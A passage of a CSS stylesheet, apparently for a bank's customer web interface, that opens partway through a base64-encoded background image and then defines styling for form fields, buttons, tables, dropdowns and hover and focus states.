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)no-repeat center center;
    background-size: 100%auto;
    opacity: 0.6;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    position: absolute;
    z-index: 0;
    transition: background-size 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946), opacity 0.15s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.mying-discover-video:hover:after {
    background-size: 120%auto
}

.mying-discover-video:active:after,
.mying-discover-video:focus:after {
    opacity: 0.65
}

ul.bulletlist>li:before {
    content: "";
    width: 6px;
    height: 6px;
    border-radius: 3px;
    background-color: #FF6200;
    position: absolute;
    left: -25px;
    top: 8px
}

.iban-tooltip::after {
    content: "";
    position: absolute;
    top: 100%;
    left: 50%;
    margin-left: -5px
}

.iban-icon-container:hover .iban-tooltip-copy {
    visibility: visible;
    opacity: 1
}

html,
body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    -webkit-overflow-scrolling: none
}

body {
    perspective: 1000px;
    background: white;
    display: block;
    -webkit-font-smoothing: antialiased;
    font-family: ingme, "Helvetica Neue", Helvetica, Arial, sans-serif !important
}

@media (min-width:768px) {
    body {
        background: #333333
    }
}

::-moz-selection {
    background-color: #FF6200;
    color: white
}

::selection {
    background-color: #FF6200;
    color: white
}

button,
a:not(.link, .link-cta) {
    outline: none !important;
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
    -webkit-appearance: normal
}

button *,
a:not(.link, .link-cta) * {
    pointer-events: none
}

*[ng-click] {
    cursor: pointer
}

a:not(.link, .link-cta):hover,
a:not(.link, .link-cta):focus {
    text-decoration: none
}

.form-control::-ms-clear,
.form-control-sidemodal::-ms-clear {
    height: 0;
    width: 0
}

.form-control.input-sm::-webkit-input-placeholder,
.input-sm.form-control-sidemodal::-webkit-input-placeholder,
.input-group-sm>.form-control::-webkit-input-placeholder,
.input-group-sm>.form-control-sidemodal::-webkit-input-placeholder,
.input-group-sm>.input-group-btn>.form-control.btn::-webkit-input-placeholder,
.input-group-sm>.input-group-btn>.btn.form-control-sidemodal::-webkit-input-placeholder {
    line-height: 1.5
}

.form-control.input-sm::-moz-placeholder,
.input-sm.form-control-sidemodal::-moz-placeholder,
.input-group-sm>.form-control::-moz-placeholder,
.input-group-sm>.form-control-sidemodal::-moz-placeholder,
.input-group-sm>.input-group-btn>.form-control.btn::-moz-placeholder,
.input-group-sm>.input-group-btn>.btn.form-control-sidemodal::-moz-placeholder {
    line-height: 1.5
}

.form-control.input-sm:-ms-input-placeholder,
.input-sm.form-control-sidemodal:-ms-input-placeholder,
.input-group-sm>.form-control:-ms-input-placeholder,
.input-group-sm>.form-control-sidemodal:-ms-input-placeholder,
.input-group-sm>.input-group-btn>.form-control.btn:-ms-input-placeholder,
.input-group-sm>.input-group-btn>.btn.form-control-sidemodal:-ms-input-placeholder {
    line-height: 1.5
}

.form-control:focus,
.form-control-sidemodal:focus,
.has-warning .form-control:focus,
.has-error .form-control:focus,
.has-success .form-control:focus {
    box-shadow: none
}

.form-control:focus,
.form-control-sidemodal:focus {
    border-color: #696969
}

.form-control.uppercase::-webkit-input-placeholder,
.uppercase.form-control-sidemodal::-webkit-input-placeholder {
    text-transform: none
}

.form-control.uppercase::-moz-placeholder,
.uppercase.form-control-sidemodal::-moz-placeholder {
    text-transform: none
}

.form-control.uppercase:-ms-input-placeholder,
.uppercase.form-control-sidemodal:-ms-input-placeholder {
    text-transform: none
}

.input-group.input-group-elastic:after {
    content: "";
    display: table;
    clear: both
}

.input-group.input-group-elastic:after {
    content: "";
    display: block;
    clear: both
}

.form-group.required label:after,
.form-group.required h5:after {
    content: " *";
    color: #d70000;
    position: relative;
    top: 3px;
    font-weight: normal;
    font-size: 20px;
    line-height: 15px
}

.form-group:not(.required) .form-control[required]::-webkit-input-placeholder:after,
.form-group:not(.required) [required].form-control-sidemodal::-webkit-input-placeholder:after,
.form-group:not(.required) .form-control.required::-webkit-input-placeholder:after,
.form-group:not(.required) .required.form-control-sidemodal::-webkit-input-placeholder:after {
    content: " *";
    color: #d70000;
    font-size: 20px;
    line-height: 13px
}

.form-group:not(.required) .form-control[required]::-moz-placeholder:after,
.form-group:not(.required) [required].form-control-sidemodal::-moz-placeholder:after,
.form-group:not(.required) .form-control.required::-moz-placeholder:after,
.form-group:not(.required) .required.form-control-sidemodal::-moz-placeholder:after {
    content: " *";
    color: #d70000;
    font-size: 20px;
    line-height: 13px
}

.form-group:not(.required) .form-control[required]:-ms-input-placeholder:after,
.form-group:not(.required) [required].form-control-sidemodal:-ms-input-placeholder:after,
.form-group:not(.required) .form-control.required:-ms-input-placeholder:after,
.form-group:not(.required) .required.form-control-sidemodal:-ms-input-placeholder:after {
    content: " *";
    color: #d70000;
    font-size: 20px;
    line-height: 13px
}

h1,
h2 {
    font-weight: normal;
    font-style: normal
}

.table>thead>tr.danger:hover>td,
.table>tbody>tr.danger:hover>td,
.table>tfoot>tr.danger:hover>td {
    background-color: #ff0b0b
}

.table>thead>tr.info:hover>td,
.table>tbody>tr.info:hover>td,
.table>tfoot>tr.info:hover>td {
    background-color: rgb(125.1388888889, 178.6111111111, 219.8611111111)
}

.table>thead>tr.success:hover>td,
.table>tbody>tr.success:hover>td,
.table>tfoot>tr.success:hover>td {
    background-color: rgb(65.1287128713, 187.8712871287, 101.4504950495)
}

.table>thead>tr.warning:hover>td,
.table>tbody>tr.warning:hover>td,
.table>tfoot>tr.warning:hover>td {
    background-color: rgb(255, 129.4, 51)
}

.btn-group.btn-group-radio .btn.selected:hover:not([disabled]):not(.disabled) {
    color: #FFF !important;
    border-color: #FF6200 !important
}

.btn-group .dropdown-toggle:hover,
.dropdown .dropdown-toggle:hover {
    border: 1px solid #A8A8A8
}

@media (max-width:599px) {

    .btn-group.open:after,
    .dropdown.open:after {
        content: "";
        display: block;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        position: fixed;
        background: black;
        opacity: 0.5;
        z-index: 1051
    }
}

.dropdown-menu>li>a:after {
    content: "";
    display: table;
    clear: both
}

.dropdown-menu>.active>a:hover,
.dropdown-menu>.active>a:focus {
    color: #696969;
    background-color: #f6f6f7
}

ul.nav li a:hover {
    background-color: #f6f6f7
}

ul.nav.nav-tabs li a:hover {
    border-top-color: #f6f6f7;
    border-left-color: #f6f6f7;
    border-right-color: #f6f6f7
}

.pagination li a:hover {
    background-color: #f6f6f7
}

hr {
    border-top: 1px solid #A8A8A8
}

iframe {
    border: none;
    display: block
}

.btn:hover,
.btn:focus,
.btn:active {
    transition: 0.3s ease-in-out !important
}

.btn:hover {
    box-shadow: 0px 6px 10px 0px rgba(0, 0, 0, 0.14), 0px 1px 18px 0px rgba(0, 0, 0, 0.12), 0px 3px 5px -1px rgba(0, 0, 0, 0.2)
}

.btn:focus {
    box-shadow: 0 0 8px #559BD1, 0 0 0 1px #559BD1;
    border-color: #559BD1 !important
}

.btn:active {
    box-shadow: none
}

.btn:hover:focus,
.btn:active:focus {
    box-shadow: 0 0 8px 0 rgba(0, 0, 0, 0.12), 0 8px 8px 0 rgba(0, 0, 0, 0.24), 0 0 8px rgb(245.5555555556, 249.4444444444, 252.4444444444), 0 0 0 1px #559BD1
}

.btn.btn-default:active,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.selected:active,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.selected:active,
.amount-currency-group .currency-dropdown .btn.disabled:active {
    background-color: rgb(255, 160.8, 102);
    border-color: rgb(255, 160.8, 102);
    color: #fff
}

.btn.btn-default:hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.selected:hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.selected:hover,
.amount-currency-group .currency-dropdown .btn.disabled:hover {
    background-color: #FF6200;
    color: #fff
}

.btn.btn-default:hover icon svg path,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.selected:hover icon svg path,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.selected:hover icon svg path,
.amount-currency-group .currency-dropdown .btn.disabled:hover icon svg path {
    fill: #FFF
}

.btn.btn-default:not(:focus):hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories .btn.selected:not(:focus):hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories .btn.selected:not(:focus):hover,
.amount-currency-group .currency-dropdown .btn.disabled:not(:focus):hover {
    box-shadow: none
}

